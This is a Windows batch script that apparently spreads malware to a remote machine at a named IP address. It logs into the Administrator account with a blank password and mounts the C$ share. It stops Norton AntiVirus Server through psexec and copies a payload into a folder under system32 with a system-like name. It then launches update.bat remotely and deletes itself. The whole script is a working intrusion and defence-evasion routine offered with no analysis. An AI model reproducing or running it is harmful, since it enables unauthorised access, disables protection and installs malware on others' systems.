net use o: /delete
net use \\213.65.158.177 /USER:Administrat�r
net use o: \\213.65.158.177\C$
psexec \\213.65.158.177 -u Administrat�r -p "" net stop "Norton AntiVirus Server"
psexec \\213.65.158.177 -u Administrat�r -p "" -c temp.bat
mkdir o:\winnt\system32\rmtcfg
mkdir o:\winnt\system32\catroot
copy copy\* o:\winnt\system32\rmtcfg
mkdir o:\winnt\system32\rmtcfg\files
mkdir o:\winnt\system32\rmtcfg\files\copy
mkdir o:\winnt\system32\rmtcfg\files\dat
mkdir o:\winnt\system32\rmtcfg\files\log
mkdir o:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* o:\winnt\system32\rmtcfg\files
copy copy\* o:\winnt\system32\rmtcfg\files\copy
copy plugin\* o:\winnt\system32\rmtcfg\files\plugin
copy dat\* o:\winnt\system32\rmtcfg\files\dat
psexec \\213.65.158.177 -u Administrat�r -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use o: /delete
net use \\213.65.158.177 /delete
del runme486962.bat
